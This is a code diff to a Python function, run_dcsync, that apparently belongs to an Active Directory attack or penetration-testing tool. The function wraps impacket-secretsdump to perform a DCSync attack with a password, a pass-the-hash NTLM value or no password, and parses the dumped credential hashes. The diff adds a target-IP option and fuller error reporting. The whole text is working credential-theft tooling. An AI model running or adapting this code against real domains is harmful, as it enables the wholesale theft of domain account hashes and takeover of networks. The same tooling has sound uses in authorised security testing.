@@ -21,16 +21,37 @@ CONTROL_ACCESS = 0x00000100
 GENERIC_ALL = 0x10000000
 
 
+def _command_output(output):
+    return "\n".join(
+        part.strip()
+        for part in (output.stdout, output.stderr)
+        if part and part.strip()
+    )
+
+
+def _failure_message(output, default):
+    combined = _command_output(output)
+    if not combined:
+        return default
+
+    lines = [line.strip() for line in combined.splitlines() if line.strip()]
+    useful_lines = [
+        line for line in lines
+        if not line.startswith("Impacket v") and "Copyright" not in line
+    ]
+    return "\n".join(useful_lines[-6:]) or default
+
+
 def run_dcsync(domain, username, password, target, *, no_pass=False, ntlm_hash=None):
     if no_pass:
         credential = f"{domain}/{username}@{target}"
-        command = ["impacket-secretsdump", "-no-pass", credential]
+        command = ["impacket-secretsdump", "-no-pass", "-target-ip", target, credential]
     elif ntlm_hash:
         credential = f"{domain}/{username}@{target}"
-        command = ["impacket-secretsdump", "-hashes", f":{ntlm_hash}", credential]
+        command = ["impacket-secretsdump", "-hashes", f":{ntlm_hash}", "-target-ip", target, credential]
     else:
         credential = f"{domain}/{username}:{password}@{target}"
-        command = ["impacket-secretsdump", credential]
+        command = ["impacket-secretsdump", "-target-ip", target, credential]
 
     output = subprocess.run(
         command,
@@ -39,10 +60,10 @@ def run_dcsync(domain, username, password, target, *, no_pass=False, ntlm_hash=N
     )
     results = []
 
-    if output.returncode != 0 and not output.stdout.strip():
-        return ["DCSync failed. Verify target reachability and credentials."]
+    if output.returncode != 0:
+        return [f"DCSync failed: {_failure_message(output, 'verify target reachability, credentials, and replication rights.')}"]
 
-    for line in output.stdout.splitlines():
+    for line in _command_output(output).splitlines():
         parts = line.split(":")
         if len(parts) > 3 and parts[1].isdigit():
             parsed = _parse_dcsync_hash(line)
@@ -59,7 +80,7 @@ def run_dcsync(domain, username, password, target, *, no_pass=False, ntlm_hash=N
                 })
 
     if not results:
-        return ["DCSync ran but no credential material was returned."]
+        return ["DCSync ran but no credential material was returned. Verify the account has replication rights."]
 
     return results
 
